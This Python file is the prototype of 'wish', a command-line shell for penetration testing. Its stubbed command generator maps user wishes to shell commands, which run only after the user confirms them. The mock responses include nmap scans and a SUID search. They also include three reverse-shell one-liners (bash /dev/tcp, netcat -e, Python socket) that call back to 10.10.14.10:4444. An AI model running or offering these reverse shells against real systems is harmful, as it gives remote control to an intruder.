#!/usr/bin/env python3
import datetime
import json
import os
import random
import signal
import subprocess
import sys
import time
import uuid
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

from wish_models import CommandState, LogFiles, WishState, CommandResult

# Constants
DEFAULT_WISH_HOME = os.path.join(os.path.expanduser("~"), ".wish")


class Wish:
    def __init__(self, wish_text: str):
        self.id = uuid.uuid4().hex[:10]
        self.wish = wish_text
        self.state = WishState.DOING
        self.command_results = []
        self.created_at = datetime.datetime.utcnow().isoformat()
        self.finished_at = None

    def to_dict(self):
        return {
            "id": self.id,
            "wish": self.wish,
            "state": self.state,
            "command_results": [cmd.to_dict() for cmd in self.command_results],
            "created_at": self.created_at,
            "finished_at": self.finished_at,
        }


# Settings
class Settings:
    def __init__(self):
        self.WISH_HOME = os.environ.get("WISH_HOME", DEFAULT_WISH_HOME)


class WishPaths:
    def __init__(self, settings: Settings):
        self.settings = settings
        self.history_path = Path(settings.WISH_HOME) / "history.jsonl"

    def ensure_directories(self):
        """Ensure all required directories exist."""
        wish_home = Path(self.settings.WISH_HOME)
        wish_home.mkdir(parents=True, exist_ok=True)

        # Ensure history file exists
        if not self.history_path.exists():
            with open(self.history_path, "w") as f:
                pass

    def get_wish_dir(self, wish_id: str) -> Path:
        """Get the directory for a specific wish."""
        return Path(self.settings.WISH_HOME) / "w" / wish_id

    def create_command_log_dirs(self, wish_id: str) -> Path:
        """Create log directories for commands of a wish."""
        cmd_log_dir = self.get_wish_dir(wish_id) / "c" / "log"
        cmd_log_dir.mkdir(parents=True, exist_ok=True)
        return cmd_log_dir


# Core functionality
class WishManager:
    def __init__(self, settings: Settings):
        self.settings = settings
        self.paths = WishPaths(settings)
        self.paths.ensure_directories()
        self.current_wish = None
        self.running_commands = {}

    def save_wish(self, wish: Wish):
        """Save wish to history file."""
        with open(self.paths.history_path, "a") as f:
            f.write(json.dumps(wish.to_dict()) + "\n")

    def load_wishes(self, limit: int = 10) -> List[Wish]:
        """Load recent wishes from history file."""
        wishes = []
        try:
            with open(self.paths.history_path, "r") as f:
                lines = f.readlines()
                for line in reversed(lines[-limit:]):
                    wish_dict = json.loads(line.strip())
                    wish = Wish(wish_dict["wish"])
                    wish.id = wish_dict["id"]
                    wish.state = wish_dict["state"]
                    wish.created_at = wish_dict["created_at"]
                    wish.finished_at = wish_dict["finished_at"]
                    # (simplified: not loading command results for prototype)
                    wishes.append(wish)
        except (FileNotFoundError, json.JSONDecodeError):
            pass
        return wishes

    def generate_commands(self, wish_text: str) -> List[str]:
        """Generate commands based on wish text (mock implementation)."""
        # In a real implementation, this would call an LLM
        # For prototype, return some predefined responses based on keywords
        commands = []
        wish_lower = wish_text.lower()

        if "scan" in wish_lower and "port" in wish_lower:
            commands = [
                "sudo nmap -p- -oA tcp 10.10.10.40",
                "sudo nmap -n -v -sU -F -T4 --reason --open -T4 -oA udp-fast 10.10.10.40",
            ]
        elif "find" in wish_lower and "suid" in wish_lower:
            commands = ["find / -perm -u=s -type f 2>/dev/null"]
        elif "reverse shell" in wish_lower or "revshell" in wish_lower:
            commands = [
                "bash -c 'bash -i >& /dev/tcp/10.10.14.10/4444 0>&1'",
                "nc -e /bin/bash 10.10.14.10 4444",
                'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);\'',
            ]
        else:
            # Default responses
            commands = [f"echo 'Executing wish: {wish_text}'", f"echo 'Processing {wish_text}' && ls -la"]

        return commands

    def execute_command(self, wish: Wish, command: str, cmd_num: int) -> CommandResult:
        """Execute a command and capture its output."""

        # Create log directories and files
        log_dir = self.paths.create_command_log_dirs(wish.id)
        stdout_path = log_dir / f"{cmd_num}.stdout"
        stderr_path = log_dir / f"{cmd_num}.stderr"
        log_files = LogFiles(stdout=stdout_path, stderr=stderr_path)

        # Create command result
        result = CommandResult.create(cmd_num, command, log_files)
        wish.command_results.append(result)

        with open(stdout_path, "w") as stdout_file, open(stderr_path, "w") as stderr_file:
            try:
                # Start the process
                process = subprocess.Popen(command, stdout=stdout_file, stderr=stderr_file, shell=True, text=True)

                # Store in running commands dict
                self.running_commands[cmd_num] = (process, result)

                # Wait for process completion (non-blocking return for UI)
                return result

            except Exception as e:
                stderr_file.write(f"Failed to execute command: {str(e)}")
                result.exit_code = 1
                result.state = CommandState.OTHERS
                result.finished_at = datetime.datetime.utcnow().isoformat()
                return result

    def summarize_log(self, stdout_path: Path, stderr_path: Path) -> str:
        """Generate a simple summary of command logs."""
        summary = []

        # Read stdout
        try:
            with open(stdout_path, "r") as f:
                stdout_content = f.read().strip()
                if stdout_content:
                    lines = stdout_content.split("\n")
                    if len(lines) > 10:
                        summary.append(f"Standard output: {len(lines)} lines")
                        summary.append("First few lines:")
                        summary.extend(lines[:3])
                        summary.append("...")
                        summary.extend(lines[-3:])
                    else:
                        summary.append("Standard output:")
                        summary.extend(lines)
                else:
                    summary.append("Standard output: <empty>")
        except FileNotFoundError:
            summary.append("Standard output: <file not found>")

        # Read stderr
        try:
            with open(stderr_path, "r") as f:
                stderr_content = f.read().strip()
                if stderr_content:
                    lines = stderr_content.split("\n")
                    if len(lines) > 5:
                        summary.append(f"Standard error: {len(lines)} lines")
                        summary.append("First few lines:")
                        summary.extend(lines[:3])
                        summary.append("...")
                    else:
                        summary.append("Standard error:")
                        summary.extend(lines)

        except FileNotFoundError:
            pass  # Don't mention if stderr is empty or missing

        return "\n".join(summary)

    def check_running_commands(self):
        """Check status of running commands and update their status."""
        for idx, (process, result) in list(self.running_commands.items()):
            if process.poll() is not None:  # Process has finished
                result.exit_code = process.returncode
                result.state = CommandState.SUCCESS if result.exit_code == 0 else CommandState.OTHERS
                result.finished_at = datetime.datetime.utcnow().isoformat()

                # Generate log summary
                if result.log_files:
                    result.log_summary = self.summarize_log(result.log_files.stdout, result.log_files.stderr)

                # Remove from running commands
                del self.running_commands[idx]

    def cancel_command(self, wish: Wish, cmd_index: int):
        """Cancel a running command."""
        if cmd_index in self.running_commands:
            process, result = self.running_commands[cmd_index]

            # Try to terminate the process
            try:
                process.terminate()
                time.sleep(0.5)
                if process.poll() is None:  # Process still running
                    process.kill()  # Force kill
            except:
                pass  # Ignore errors in termination

            # Update result
            result.state = CommandState.USER_CANCELLED
            result.finished_at = datetime.datetime.utcnow().isoformat()
            del self.running_commands[cmd_index]

            return f"Command {cmd_index} cancelled."
        else:
            return f"Command {cmd_index} is not running."

    def format_wish_list_item(self, wish: Wish, index: int) -> str:
        """Format a wish for display in wishlist."""
        created_time = datetime.datetime.fromisoformat(wish.created_at).strftime("%H:%M:%S")
        if wish.state == WishState.DONE and wish.finished_at:
            finished_time = datetime.datetime.fromisoformat(wish.finished_at).strftime("%H:%M:%S")
            return f"[{index}] wish: {wish.wish[:30]}{'...' if len(wish.wish) > 30 else ''}  (started at {created_time} ; done at {finished_time})"
        else:
            return f"[{index}] wish: {wish.wish[:30]}{'...' if len(wish.wish) > 30 else ''}  (started at {created_time} ; {wish.state})"


# UI
class WishCLI:
    def __init__(self):
        self.settings = Settings()
        self.manager = WishManager(self.settings)
        self.running = True

    def print_prompt(self):
        """Print the wish prompt."""
        print("\nwish✨ ", end="", flush=True)

    def print_question(self):
        """Print the question prompt."""
        print("\nwish❓ ", end="", flush=True)

    def handle_wishlist(self):
        """Display the list of wishes."""
        wishes = self.manager.load_wishes()
        if not wishes:
            print("No wishes found.")
            return

        print("")
        for i, wish in enumerate(wishes, 1):
            print(self.manager.format_wish_list_item(wish, i))

        print("\nもっと見る場合はエンターキーを、コマンドの経過・結果を確認したい場合は番号を入力してください。")
        self.print_question()
        choice = input().strip()

        if choice and choice.isdigit():
            choice_idx = int(choice) - 1
            if 0 <= choice_idx < len(wishes):
                self.handle_wish_details(wishes[choice_idx])
            else:
                print("Invalid selection.")

    def handle_wish_details(self, wish: Wish):
        """Show details for a specific wish."""
        # For prototype, just show a simulated view
        print(f"\nWish: {wish.wish}")
        print(f"Status: {wish.state}")
        print(f"Created at: {wish.created_at}")
        if wish.finished_at:
            print(f"Finished at: {wish.finished_at}")

        # In a real implementation, we'd load and display command results
        # For prototype, show mock data
        print("\nCommands:")
        for i, cmd in enumerate(["find / -perm -u=s -type f 2>/dev/null"], 1):
            print(f"[{i}] cmd: {cmd} ({wish.state})")

        self.print_question()
        choice = input().strip()

        if choice and choice.isdigit():
            print("\n(Simulating log output for prototype)")
            if wish.state == WishState.DONE:
                print("\nLog Summary:")
                print("/usr/bin/sudo")
                print("/usr/bin/passwd")
                print("/usr/bin/chfn")
                print("...")
                print(f"\nDetails are available in log files under {self.manager.paths.get_wish_dir(wish.id)}/c/log/")
            else:
                print("\n(Simulating tail -f output)")
                print("/usr/bin/sudo")
                print("/usr/bin/passwd")
                print("...")

    def execute_wish(self, wish_text: str):
        """Process a wish and execute resulting commands."""
        if not wish_text:
            return

        # Create a new wish
        wish = Wish(wish_text)
        wish.state = WishState.DOING
        self.manager.current_wish = wish

        # Generate commands
        commands = self.manager.generate_commands(wish_text)

        # Handle user input for target IP if needed
        if "scan" in wish_text.lower() and "port" in wish_text.lower():
            print("\n**What's the target IP address or hostname?**")
            self.print_question()
            target = input().strip()
            if target:
                commands = [cmd.replace("10.10.10.40", target) for cmd in commands]

        # Display commands and ask for confirmation
        if len(commands) > 1:
            print(f"\nこのコマンドをすべて実行しますか？ [Y/n]")
            for cmd_num, cmd in enumerate(commands, 1):
                print(f"[{cmd_num}] {cmd}")

            self.print_question()
            confirm = input().strip().lower()

            if confirm == "n":
                print("\nそのまま実行するコマンドを `1` 、 `1,2` または `1-3` の形式で指定してください。")
                self.print_question()
                selection = input().strip()

                # Parse selection
                selected_indices = []
                try:
                    if "," in selection:
                        for part in selection.split(","):
                            if part.strip().isdigit():
                                selected_indices.append(int(part.strip()) - 1)
                    elif "-" in selection:
                        start, end = selection.split("-")
                        selected_indices = list(range(int(start.strip()) - 1, int(end.strip())))
                    elif selection.isdigit():
                        selected_indices = [int(selection) - 1]
                except:
                    print("Invalid selection format.")
                    return

                # Filter commands based on selection
                if selected_indices:
                    commands = [commands[i] for i in selected_indices if 0 <= i < len(commands)]
                else:
                    print("No valid commands selected.")
                    return
        else:
            # Single command
            print(f"\nこのコマンドを実行しますか？ [Y/n]")
            print(f"[1] {commands[0]}")

            self.print_question()
            confirm = input().strip().lower()

            if confirm == "n":
                return

        # Execute commands
        print("\nコマンドの実行を開始しました。経過は Ctrl-R または `wishlist` で確認できます。")
        for cmd_num, cmd in enumerate(commands, start=1):
            result = self.manager.execute_command(wish, cmd, cmd_num)

        # Save wish to history
        self.manager.save_wish(wish)

    def run(self):
        """Main loop of the CLI."""
        print("Welcome to wish v0.0.0 - Your wish, our command")

        while self.running:
            # Check running commands status
            self.manager.check_running_commands()

            # Display prompt and get input
            self.print_prompt()
            try:
                wish_text = input().strip()
            except (KeyboardInterrupt, EOFError):
                print("\nExiting wish. Goodbye!")
                sys.exit(0)

            # Process input
            if wish_text.lower() == "exit" or wish_text.lower() == "quit":
                print("Exiting wish. Goodbye!")
                self.running = False
            elif wish_text.lower() == "wishlist":
                self.handle_wishlist()
            else:
                self.execute_wish(wish_text)


def main():
    """Entry point for the wish shell."""
    cli = WishCLI()
    cli.run()


if __name__ == "__main__":
    main()
